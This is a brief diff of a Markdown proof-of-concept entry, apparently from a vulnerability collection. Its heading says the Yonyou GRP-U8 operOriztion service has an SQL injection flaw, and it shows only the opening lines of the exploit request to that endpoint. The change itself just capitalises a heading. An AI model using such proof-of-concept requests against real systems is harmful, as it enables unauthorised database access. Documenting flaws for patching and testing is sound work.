@@ -1,7 +1,7 @@
 ## 用友GRP-U8-operOriztion存在SQL注入漏洞
 
 
-## poc
+## POC
 ```
 POST /services/operOriztion HTTP/1.1
 Host: your-ip
